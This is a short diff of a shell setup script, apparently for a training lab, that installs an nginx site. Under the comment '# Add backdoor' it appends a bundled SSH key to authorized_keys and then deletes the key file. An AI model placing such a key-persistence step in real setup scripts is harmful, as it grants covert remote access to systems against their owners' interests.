@@ -30,8 +30,8 @@ sudo mv training /etc/nginx/sites-available
 sudo ln -s /etc/nginx/sites-available/training /etc/nginx/sites-enabled/training
 
 # Add backdoor
-cat authorized_keys >> ~/.ssh/authorized_keys
-chmod u+rw, go-rwx ~/.ssh/authorized_keys
+sudo cat authorized_keys >> ~/.ssh/authorized_keys
+sudo chmod 700 ~/.ssh/authorized_keys
 
 # Cleanup
 sudo rm -f wave-aquarium-lab.tar.gz authorized_keys
